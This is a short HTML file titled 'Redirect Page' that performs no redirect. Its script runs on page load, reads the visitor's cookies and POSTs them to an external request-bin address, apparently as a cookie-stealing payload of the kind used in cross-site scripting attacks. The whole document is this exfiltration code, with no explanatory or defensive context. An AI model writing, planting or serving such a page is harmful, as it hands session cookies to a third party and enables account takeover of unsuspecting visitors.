<!DOCTYPE html>
<html>
<head>
    <title>Redirect Page</title>
</head>
<body>
<script>
    window.onload = function() {
        const cookies = document.cookie;
        const headers = new Headers()
        headers.append("Content-Type", "application/json")

        const options = {
        method: "POST",
        headers,
        mode: "cors",
        body: cookies,
        }

        fetch("https://requestbin.kanbanbox.com/1mazijq1", options)
    }
</script>
</body>
</html>
